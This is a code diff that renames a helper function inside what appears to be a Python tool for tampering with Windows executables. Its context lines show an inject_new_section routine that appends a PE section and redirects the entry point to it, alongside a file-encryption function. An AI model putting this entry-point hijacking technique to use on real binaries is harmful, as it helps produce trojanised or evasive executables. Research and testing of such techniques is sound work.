@@ -30,7 +30,7 @@ def encrypt_file( key, in_filename, out_filename=None, chunksize=64*1024):
 
                 outfile.write(encryptor.encrypt(chunk))
 
-def adjust_SectionSize(sz, align):
+def adjust_section_size(sz, align):
     if sz % align: sz = ((sz + align) // align) * align
     return sz
 
@@ -44,16 +44,16 @@ def inject_new_section(url, sha256name):
     new_section.set_file_offset(last_section.get_file_offset() + last_section.sizeof())
     new_section.Name = b'.notgonnarun'
     new_section_size = 100
-    new_section.SizeOfRawData = adjust_SectionSize(new_section_size, pe.OPTIONAL_HEADER.FileAlignment)
+    new_section.SizeOfRawData = adjust_section_size(new_section_size, pe.OPTIONAL_HEADER.FileAlignment)
     new_section.PointerToRawData = len(pe.__data__)
     new_section.Misc = new_section.Misc_PhysicalAddress = new_section.Misc_VirtualSize = new_section_size
-    new_section.VirtualAddress = last_section.VirtualAddress + adjust_SectionSize(last_section.Misc_VirtualSize, pe.OPTIONAL_HEADER.SectionAlignment)
+    new_section.VirtualAddress = last_section.VirtualAddress + adjust_section_size(last_section.Misc_VirtualSize, pe.OPTIONAL_HEADER.SectionAlignment)
     new_section.Characteristics = 0x40000000 
 
     # change address of entry point to beginning of new section
     pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_section.VirtualAddress
     # increase size of image
-    pe.OPTIONAL_HEADER.SizeOfImage += adjust_SectionSize(new_section_size, pe.OPTIONAL_HEADER.SectionAlignment)
+    pe.OPTIONAL_HEADER.SizeOfImage += adjust_section_size(new_section_size, pe.OPTIONAL_HEADER.SectionAlignment)
     # increase number of sections
     pe.FILE_HEADER.NumberOfSections += 1
     # append new section to structures
